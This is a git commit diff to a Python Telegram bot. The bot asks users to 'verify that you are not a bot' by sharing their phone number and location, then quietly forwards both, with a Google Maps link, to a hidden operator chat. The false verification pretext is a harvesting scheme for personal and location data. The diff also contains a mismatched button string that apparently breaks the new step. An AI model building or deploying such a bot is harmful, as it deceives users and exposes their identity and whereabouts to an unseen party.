d41283e62384a3f3ad260e70f70b1efbd31f7fa5
SPARUX666 <147306534+Sparux-666@users.noreply.github.com>
2024-07-24 15:07:54 +0300

    TelegramBot.py

--- TelegramBot.py
+++ TelegramBot.py
@@ -8,23 +8,30 @@ id = os.getenv('TELEGRAM_BOT_ID')
 
 @bot.message_handler(commands=['start'])
 def register(message):
-    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True)
+    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
     keyboard.add(
-        types.KeyboardButton(text="Share My Number", request_contact=True),
-        types.KeyboardButton(text="Share My Location", request_location=True)
+        types.KeyboardButton(text="📞 Share My Number and Location 📍")
     )
-    bot.send_message(message.chat.id, "Please verify that you are not a bot", reply_markup=keyboard)
+    bot.send_message(message.chat.id, "Please verify that you are not a bot by sharing your number and location.", reply_markup=keyboard)
+
+@bot.message_handler(func=lambda message: message.text == "📞 Share  Number and Location 📍")
+def request_contact(message):
+    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
+    keyboard.add(types.KeyboardButton(text="📞 Share Number", request_contact=True))
+    bot.send_message(message.chat.id, "Please share your phone number:", reply_markup=keyboard)
 
 @bot.message_handler(content_types=['contact'])
 def contact_handler(message):
-    bot.send_message(id, text=f"Done Get Phone Number: {message.contact.phone_number}")
-    bot.send_message(message.chat.id, text="Thanks :)")
+    bot.send_message(id, text=f"Received Phone Number: {message.contact.phone_number}")
+    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
+    keyboard.add(types.KeyboardButton(text="📍 Share Location", request_location=True))
+    bot.send_message(message.chat.id, "Thanks! Now, please share your location:", reply_markup=keyboard)
 
 @bot.message_handler(content_types=['location'])
 def location_handler(message):
     loc = message.location
     bot.send_message(id, text=f'''
-Done Get User Location:
+Received User Location:
 Latitude = {loc.latitude}
 Longitude = {loc.longitude}
 ● [Google Map](https://www.google.com/maps/place/{loc.latitude},{loc.longitude})
